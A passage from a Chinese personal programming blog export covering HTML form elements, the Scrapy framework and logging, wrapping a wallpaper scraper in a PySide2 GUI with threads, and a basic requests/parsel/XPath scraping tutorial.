text：文本框、里面可以输入任何文字
password：密码框、用户看不见输入的密码
radio：单选按钮、实现多选一
name：表单元素名字、必须有相同的名字
checkbox：复选框、实现多选
value：显示默认值
checked：默认选择
submit：提交到服务器
reset：清楚表单中的所有数据
button：定义可点击按钮，通常后期结合js一起使用
file：文件域、上传文件使用

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>名字<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>名字<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>名字<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre>
<ul>
<li>select下拉表单元素</li>
</ul>
<pre class="language-markup" data-language="markup"><code class="language-markup"># 定义下拉列表
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span><span class="token punctuation">></span></span>选项1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span><span class="token punctuation">></span></span>选项2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span><span class="token punctuation">></span></span>选项3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
	...
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></code></pre>
<ul>
<li>textarea文本域元素</li>
</ul>
<pre class="language-markup" data-language="markup"><code class="language-markup"># 大量输入文本，经常用于留言板、评论	</code></pre>
<h4 id="查找文档">查找文档</h4>
<ul>
<li>百度：<a href="https://www.baidu.com/">百度一下，你就知道 (baidu.com)</a></li>
<li>W3C：<a href="https://www.w3school.com.cn/">w3school 在线教程</a></li>
<li>MDN：<a href="https://developer.mozilla.org/zh-CN/">MDN Web Docs (mozilla.org)</a></li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapy框架</title>
    <url>/python/pythonwebcatch-scrapy/</url>
    <content><![CDATA[<h1>Scrapy简介：</h1>
<p>Scrapy是用纯python实现一个爬取网站数据、提取结构性数据而编写的应用框架，用途非常广泛。Scrapy使用了Twisted异步网络框架，可以加快我们的下载速度。</p>
<p>异步：调用在发出之后，这个调用就直接返回，不管有无结果</p>
<p>非阻塞：关注的是程序在等待结果时的状态，不能立刻得到结果之前，该调用不会阻塞当前线程</p>
<h2 id="scrapy框架：">scrapy框架：</h2>
<p><img src="https://i.loli.net/2021/08/21/bhSfcJzgnM3Fjvk.png" alt=""></p>
<ul>
<li>scrapy Engine(引擎)：总指挥:负责数据和信号的在不同模块间的传递，scrapy已经实现</li>
<li>scheduler(调度器)：一个队列，存放引擎发过来的request请求，scrapy已经实现</li>
<li>Downloader (下载器)：下载把引擎发过来的requests请求，并返回给引擎，scrapy已经实现</li>
<li>Spider (爬虫)：处理引擎发来来的response，提取数据，提取url，并交给引擎，需要手写</li>
<li>Item Pipeline(管道)：处理引擎传过来的数据，比如存储，需要手写</li>
<li>Downloader Middlewares(下载中间件)：可以自定义的下载扩展，比如设置代理，一般不用手写</li>
<li>Spider MiddlewaresSpider(中间件)：可以自定义requests请求和进行response过滤，一般不用手写</li>
</ul>
<h2 id="创建Spider：">创建Spider：</h2>
<ol>
<li>创建一个scrapy项目——scrapy startproject myspider</li>
<li>生成一个爬虫——scrapy genspider xxxx “<a href="http://xxxx.cn">xxxx.cn</a>”</li>
<li>提取数据——完善spider，使用xpath等方法</li>
<li>保存数据——pipeline中保存数据</li>
</ol>
<p>定义多个pipeline，例如先处理数据再存储数据，例如不同的域名要进行不同的提取，但要注意process_item名称不能变，其形参（spider）<a href="http://xn--spider-2x8i375aqy9kyxa.name">可以通过spider.name</a> == &quot;itcast&quot;进行判断操作。</p>
<pre class="language-none"><code class="language-none"># logging：不同等级的日志，保存到本地，
import logging
# 获取当前日志输出位置
logger &#x3D; logging.getLogger(__name__)
# setting可以设置LOG_FILE &#x3D; &#39;.&#x2F;log.log&#39;保存到本地
logger.warning(item)</code></pre>
<p>scrapy</p>
<ul>
<li>settings中设置LOG_LEVEL=“WARNING”</li>
<li>settings中设置LOG_FILE=“./a.log”#设置日志保存的位置，设置会后终端不会显示日志内容</li>
<li>import logging,实例化logger的方式在任何文件中使用logger输出内容。</li>
</ul>
<p>普通项目中</p>
<ul>
<li>
<pre><code>import logging
#设置日志输出的样式，格式。
logging.basicConfig(...)
# 实例化logger=logging.getLogger(__name__) 在任何py文件中调用logger即可
</code></pre>
</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>Pyside2封装爬虫</title>
    <url>/python/Pyside2/</url>
    <content><![CDATA[<h3 id="Python图形界面开发">Python图形界面开发</h3>
<p>程序的用户交互界面我们称之为UI</p>
<p>目前python语言GUI有以下选择</p>
<ul>
<li>Tkinter：官方标准库，稳定，程序小，控件较少</li>
<li>wxPython：基于wxWidgets的python库，控件丰富，文档少，用户少</li>
<li>Pyside2、PyQt5：基于Qt的python库，控件丰富，跨平台体验好，文档完善用户多，但程序较大。（是真的555</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 豆瓣源</span>
pip install pyside2 <span class="token operator">-</span>i https<span class="token punctuation">:</span><span class="token operator">//</span>pypi<span class="token punctuation">.</span>douban<span class="token punctuation">.</span>com<span class="token operator">/</span>simple<span class="token operator">/</span></code></pre>
<h3 id="利用QtDesigner进行布局规python划">利用QtDesigner进行布局规python划</h3>
<p>pip安装好pyside2包后到package文件夹下有Designer.exe，打开进行布局，如下是我的布局。这里要注意，一定要把所有控件布局在一起，这样控件才会随着软件的缩放而整体缩放。</p>
<p><img src="https://i.loli.net/2021/08/21/8pWVTxKyRF2ABaf.png" alt=""></p>
<p>具体使用方法这里参考官方文档：<a href="https://doc.qt.io/qt-5/qapplication.html">QApplication Class | Qt Widgets 5.15.5</a></p>
<p>中文版简化教程：<a href="http://www.byhy.net/tut/py/gui/qt_01/">Python Qt 简介 | 白月黑羽 (byhy.net)</a></p>
<h3 id="对源程序进行重构">对源程序进行重构</h3>
<p>源程序目标网址类型较少，在这里更换为Wallhaven。</p>
<h4 id="pyside2自定义类例程">pyside2自定义类例程</h4>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> QApplication<span class="token punctuation">,</span> QMessageBox
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtUiTools <span class="token keyword">import</span> QUiLoader

<span class="token keyword">class</span> <span class="token class-name">Wallpaper</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>button
        self<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>textEdit
        <span class="token comment"># 注意，刚刚设计的.ui保存至程序当前目录下</span>
        self<span class="token punctuation">.</span>wp <span class="token operator">=</span> QUiLoader<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'main.ui'</span><span class="token punctuation">)</span>
        <span class="token comment"># xxxx是.ui中的button参数名称</span>
        self<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>xxxx<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>handleCalc<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">handleCalc</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token comment"># button点击后运行函数</span>
		
		
app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
stats <span class="token operator">=</span> Stats<span class="token punctuation">(</span><span class="token punctuation">)</span>
stats<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h4 id="重构爬虫函数进行类封装">重构爬虫函数进行类封装</h4>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Wallpaper</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    	<span class="token comment"># sort即是选择类型</span>
    	self<span class="token punctuation">.</span>sort <span class="token operator">=</span> <span class="token number">0</span>
    	self<span class="token punctuation">.</span>signal_1 <span class="token operator">=</span> <span class="token number">2</span>
    	self<span class="token punctuation">.</span>signal_2 <span class="token operator">=</span> <span class="token number">0</span>
    	self<span class="token punctuation">.</span>sorts_name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'动漫'</span><span class="token punctuation">,</span> <span class="token string">'女生动漫'</span><span class="token punctuation">,</span> <span class="token string">'明日方舟'</span><span class="token punctuation">,</span> <span class="token string">'城市'</span><span class="token punctuation">,</span> <span class="token string">'简约'</span>
    <span class="token punctuation">,</span> <span class="token string">'科幻'</span><span class="token punctuation">,</span> <span class="token string">'繁星'</span><span class="token punctuation">,</span> <span class="token string">'英雄联盟'</span><span class="token punctuation">,</span> <span class="token string">'太空'</span><span class="token punctuation">,</span> <span class="token string">'航海王'</span><span class="token punctuation">,</span> <span class="token string">'天空'</span><span class="token punctuation">,</span> <span class="token string">'风景'</span><span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>ui <span class="token operator">=</span> QUiLoader<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'wallpaper.ui'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>button<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>handleCalc<span class="token punctuation">)</span>
        <span class="token comment"># 添加类型</span>
        self<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>cb<span class="token punctuation">.</span>addItems<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sorts_name<span class="token punctuation">)</span>
		<span class="token comment"># 将类型选择框与信号槽连接     self.ui.cb.currentIndexChanged.connect(self.selectionchange)</span>
		<span class="token comment"># 打印抓取进度</span>
        self<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>ms<span class="token punctuation">.</span>text_print<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>gui<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">selectionchange</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    	<span class="token comment"># 获取当前类型选中序号i，0为起始  </span>
        self<span class="token punctuation">.</span>sort <span class="token operator">=</span> i

    <span class="token keyword">def</span> <span class="token function">handleCalc</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    	<span class="token comment"># 对每个网址的最大页数分别赋值</span>
        page <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2763</span><span class="token punctuation">,</span> <span class="token number">2678</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">315</span><span class="token punctuation">,</span> <span class="token number">539</span><span class="token punctuation">,</span> <span class="token number">418</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">336</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">764</span><span class="token punctuation">,</span> <span class="token number">1311</span><span class="token punctuation">]</span>
		<span class="token comment"># 进行勾选框判断</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>check<span class="token punctuation">.</span>isChecked<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 停止或开始信号标记</span>
            self<span class="token punctuation">.</span>signal_1 <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token comment"># 满足开始信号</span>
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>signal_1 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token comment"># 更改button名称</span>
                self<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>button<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'停止'</span><span class="token punctuation">)</span>
                <span class="token comment"># 列表元素均为网址，在此插入，略</span>
                sorts <span class="token operator">=</span> <span class="token punctuation">[</span>anime<span class="token punctuation">,</span> anime_girl<span class="token punctuation">,</span> ark_nights<span class="token punctuation">,</span> cityscape<span class="token punctuation">,</span> minimalism<span class="token punctuation">,</span> science<span class="token punctuation">,</span> stars<span class="token punctuation">,</span> legends<span class="token punctuation">,</span> space<span class="token punctuation">,</span> one_peace<span class="token punctuation">,</span> sky<span class="token punctuation">,</span> landscape<span class="token punctuation">]</span>
                base_url <span class="token operator">=</span> sorts<span class="token punctuation">[</span>self<span class="token punctuation">.</span>sort<span class="token punctuation">]</span>
                <span class="token comment"># 对文件夹名称、路径分类化</span>
                fold_name <span class="token operator">=</span> self<span class="token punctuation">.</span>sorts_name<span class="token punctuation">[</span>self<span class="token punctuation">.</span>sort<span class="token punctuation">]</span>
                fold_path <span class="token operator">=</span> self<span class="token punctuation">.</span>sorts_name<span class="token punctuation">[</span>self<span class="token punctuation">.</span>sort<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\\'</span>

				<span class="token comment"># &lt;insert></span>
				
            <span class="token keyword">if</span> self<span class="token punctuation">.</span>signal_1 <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>button<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'开始'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
        	<span class="token comment"># 勾选框未勾选提示</span>
            msgBox1 <span class="token operator">=</span> QMessageBox<span class="token punctuation">(</span><span class="token punctuation">)</span>
            msgBox1<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">"( ゜-゜)つロ"</span><span class="token punctuation">)</span>
            msgBox1<span class="token punctuation">.</span>setText<span class="token punctuation">(</span><span class="token string">'记得勾选"我已阅读《使用手册》"哦~'</span><span class="token punctuation">)</span>
            msgBox1<span class="token punctuation">.</span>setStandardButtons<span class="token punctuation">(</span>QMessageBox<span class="token punctuation">.</span>Ok<span class="token punctuation">)</span>
            msgBox1<span class="token punctuation">.</span>setDefaultButton<span class="token punctuation">(</span>QMessageBox<span class="token punctuation">.</span>Ok<span class="token punctuation">)</span>
            ret <span class="token operator">=</span> msgBox1<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">gui</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    	<span class="token comment"># 打印抓取进度</span>
        self<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>infoBox<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># 让infoBox刷新至最新一条</span>
        self<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>infoBox<span class="token punctuation">.</span>ensureCursorVisible<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>
<span class="token comment"># 可以更换自己的logo，保存在当前目录下</span>
app<span class="token punctuation">.</span>setWindowIcon<span class="token punctuation">(</span>QIcon<span class="token punctuation">(</span><span class="token string">'logo.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
wallpaper_catch <span class="token operator">=</span> Wallpaper<span class="token punctuation">(</span><span class="token punctuation">)</span>
wallpaper_catch<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 当最后一个线程结束时，程序关闭</span>
sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>requests向服务器请求需要时间，爬虫打印进程又直接对主程序进行渲染，其中最末尾的app.exec_()就是让主线程，不断循环处理用户操作的事件。要解决这个问题，就要让爬虫在子线程里运行，注意不能直接对主窗口进行渲染操作</p>
<p>python既支持多进程，也支持多线程。运行在操作系统中的每一个进程都可以拥有多个线程，每个进程具有自己的内存。即便如此，网页抓取不能仅仅依靠提高进程的数量，而应该从代码优化的角度考虑问题。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread <span class="token comment"># 引入threading模块</span></code></pre>
<p>同时，我们要让子线程在打印时发出信号给主线程（推荐所有图片渲染的操作都在主线程中进行，避免出现程序无响应的问题）</p>
<p>因此我们创建Catch_Signal类，继承自QObject类：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Catch_Signals</span><span class="token punctuation">(</span>QObject<span class="token punctuation">)</span><span class="token punctuation">:</span>
    procedure <span class="token operator">=</span> Signal<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span></code></pre>
<p>在Wallpaper类中定义实例属性：</p>
<pre class="language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>ms <span class="token operator">=</span> Catch_Signals<span class="token punctuation">(</span><span class="token punctuation">)</span>
self<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>ms<span class="token punctuation">.</span>procedure<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>gui<span class="token punctuation">)</span></code></pre>
<p>再在Wallpaper类中定义GUI绘制函数：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gui</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    self<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>infoBox<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
    self<span class="token punctuation">.</span>wp<span class="token punctuation">.</span>infoBox<span class="token punctuation">.</span>ensureCursorVisible<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>将爬虫程序放入子线程：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 插入&lt;insert>处</span>
            thread <span class="token operator">=</span> Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>threadSend<span class="token punctuation">,</span>
                 args<span class="token operator">=</span><span class="token punctuation">(</span>base_url<span class="token punctuation">,</span> fold_name<span class="token punctuation">,</span> fold_path<span class="token punctuation">)</span><span class="token punctuation">)</span>
            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 定义子线程函数            </span>
<span class="token keyword">def</span> <span class="token function">threadSend</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> base_url<span class="token punctuation">,</span> fold_name<span class="token punctuation">,</span> fold_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># 爬虫函数略</span>
    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>URLRequired <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token comment"># 略</span></code></pre>
<p>补充import：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> QApplication<span class="token punctuation">,</span> QMessageBox
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtUiTools <span class="token keyword">import</span> QUiLoader
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtGui <span class="token keyword">import</span> QIcon
<span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtCore <span class="token keyword">import</span> Signal<span class="token punctuation">,</span> QObject</code></pre>
<h3 id="对源程序继续完善">对源程序继续完善</h3>
<h4 id="Sleep延迟">Sleep延迟</h4>
<p>我们在for循环里加入sleep函数</p>
<p>引入库：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint</code></pre>
<p>for循环下载img最后一行加入：</p>
<pre class="language-python" data-language="python"><code class="language-python">time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>sleep_time <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">)</span></code></pre>
<p>当然，子进程try：第一行加入：</p>
<pre class="language-python" data-language="python"><code class="language-python">sleep_time <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">201</span><span class="token punctuation">)</span></code></pre>
<p>保证在每次下载间隔1~2s</p>
<h4 id="sys-exit-app-exec">sys.exit(app.exec_())</h4>
<p>sys.exit(app.exec_())这行代码的意思是，当最后一个线程结束时，退出命令行（即总程序）。但是一旦子线程开始便无法通过这行语句停下来，尝试用signal进行判断限制，无果；尝试直接将其放入子线程，无果；尝试寻找退出主程序弹窗函数，无果…</p>
<p>注意！这里是个坑，当ui界面是动态加载时，重写closeEvent函数是无效的！</p>
<p>也就是说，当需要重写closeEvent函数时，必须要静态加载ui文件，在同目录cmd命令行下运行以下命令</p>
<pre class="language-python" data-language="python"><code class="language-python">pyside2<span class="token operator">-</span>uic xxxxx<span class="token punctuation">.</span>ui <span class="token operator">-</span><span class="token operator">></span> xxxxx<span class="token punctuation">.</span>py</code></pre>
<p>然后在主函数中调用该py文件即相当于调用ui文件</p>
<h4 id="更改logo">更改logo</h4>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PySide2<span class="token punctuation">.</span>QtGui <span class="token keyword">import</span> QIcon
<span class="token comment"># 根目录下保存名为'logo.png'的logo</span>
app<span class="token punctuation">.</span>setWindowIcon<span class="token punctuation">(</span>QIcon<span class="token punctuation">(</span><span class="token string">'logo.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>当然这时Qt窗口的logo，APP的logo会在打包时添加</p>
<h4 id="附属文件插入">附属文件插入</h4>
<p>打包完成后别着急运行，好些个附属文件还没有转移，例如logo.png文件是没有被打包进去的，因此需要我们手动粘贴到相应目录下。</p>
<p>这时运行可执行文件即可看到我们的程序。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Pyside2</tag>
      </tags>
  </entry>
  <entry>
    <title>Python爬虫基础普及</title>
    <url>/python/Python-catch-base/</url>
    <content><![CDATA[<p>其实Python采集网络数据以及与用户交互的能力或许没有JavaScript强，但是对采集到的数据进行分析，二次加工以及数据库存储的能力就要好很多。随着社会的发展，科学技术的提升，发展的不只有爬虫技术，还有反爬技术和企业对数据保护的重视程度。许多视频的部分案例已经失效，包括O’Reilly的部分老版书籍。反爬技术也是根据爬虫技术衍生而来的，只要我们不断地提高技术，<em><strong>可见即可爬</strong></em>。</p>
<h3 id="Python爬虫思路">Python爬虫思路</h3>
<h4 id="1-明确需求（Website）">1.明确需求（Website）</h4>
<h4 id="2-发送请求（Request）">2.发送请求（Request）</h4>
<ul>
<li>请求方式：Get、Post</li>
<li>请求URL：URL全称统一资源定位符，如一个网页文档、一张图片、一个视频等都可以用URL唯一来确定</li>
<li>请求头：头部信息如User-Agent、Host、Cookies等信息</li>
<li>请求体：请求时额外携带的数据，如表单提交时的表单数据</li>
</ul>
<h4 id="3-获取数据（Response）">3.获取数据（Response）</h4>
<ul>
<li>响应状态：有多种响应状态，如200代表成果、301跳转、404找不到页面、502服务器错误等</li>
<li>响应头：如内容类型、内容长度、服务器信息、设置Cookie等</li>
<li>响应体：最主要的部分、包含了请求资源的内容，如网页的HTML、图片的二进制数据等</li>
</ul>
<h4 id="4-解析数据（Parse）">4.解析数据（Parse）</h4>
<ul>
<li>直接处理</li>
<li>Json解析</li>
<li>正则表达式</li>
<li>BeautifulSoup</li>
<li>Parsel</li>
<li>Xpath/CSS</li>
</ul>
<h4 id="5-存储数据（Database）">5.存储数据（Database）</h4>
<ul>
<li>文本：如纯文本、Json、Xml等</li>
<li>关系型数据库：如MySQL、Orcacle、SQL Server等</li>
<li>非关系型数据库：如MongoDB、Redis等key-value形式储存</li>
<li>二进制文件：如图片、视频、音频等直接保存成特定文件格式</li>
</ul>
<h3 id="实战（QQ壁纸）">实战（QQ壁纸）</h3>
<h4 id="指定URL">指定URL</h4>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> parsel		<span class="token comment"># 引入第三方库</span>
<span class="token comment"># 目标网址：</span>
base_url <span class="token operator">=</span> <span class="token string">'http://www.qqbizhi.com/desk/meinv/'</span></code></pre>
<p>打开网址，看到有二十一张图片，点开来发现其实是另一个网址，因此我们要在基地址抓取到第二级地址，再对图片进行抓取。</p>
<h4 id="UA伪装">UA伪装</h4>
<p>UA，即User-Agent，也就是请求头，随便打开一个网址，按下F12</p>
<p><img src="https://i.loli.net/2021/08/20/KAet8voUBPGFyTE.png" alt=""></p>
<p>看！蓝色的，即是UA，不配置的话默认是python哦。那该如何配置呢？修改headers中的键值对即可，即加上下面这句话：</p>
<pre class="language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) '</span>
                        <span class="token string">'Gecko/20100101 Firefox/91.0'</span><span class="token punctuation">&#125;</span></code></pre>
<h4 id="发起请求（模拟浏览器）">发起请求（模拟浏览器）</h4>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># get返回结果赋值给response</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>base_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
<span class="token comment"># 配置编码方式，使其自适应网站编码类型</span>
response<span class="token punctuation">.</span>encoding <span class="token operator">=</span> response<span class="token punctuation">.</span>apparent_encoding
<span class="token comment"># 获取文本</span>
data <span class="token operator">=</span> response<span class="token punctuation">.</span>text</code></pre>
<p>这里注意，后面保存图片为二进制，获取二进制数据格式就要用content</p>
<ul>
<li>response.text 返回的是一个 unicode 型的文本数据</li>
<li>response.content 返回的是 bytes 型的二进制数据</li>
</ul>
<h4 id="获取相应数据">获取相应数据</h4>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># parsel解析，获取HTML源码</span>
html_data <span class="token operator">=</span> parsel<span class="token punctuation">.</span>Selector<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token comment"># xpath对目标定位</span>
data_list <span class="token operator">=</span> html_data<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//div[@class="imglist"]/figure/a/@href'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 获取目标赋给一个列表（不止一个目标）</span>
result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'http://www.qqbizhi.com'</span> <span class="token operator">+</span> data_url <span class="token keyword">for</span> data_url <span class="token keyword">in</span> data_list<span class="token punctuation">]</span></code></pre>
<p>这里涉及一丢丢xpath语法:</p>
<p>//表示跨行定位</p>
<p>[@class=“xxxxxxx”]表示属性class的值为xxxxxxx的标签，也可通过id等其他属性进行定位，但要注意有些属性是动态属性，一般就取id或class。</p>
<p>@href其属性的值就是我们所需，结合基地址赋值，后面进行循环提取</p>
<h4 id="解析数据">解析数据</h4>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 对每个url进行抓取</span>
<span class="token keyword">for</span> any_list <span class="token keyword">in</span> result<span class="token punctuation">:</span>

	<span class="token comment"># 同上，基地址变为相册地址，UA依旧</span>
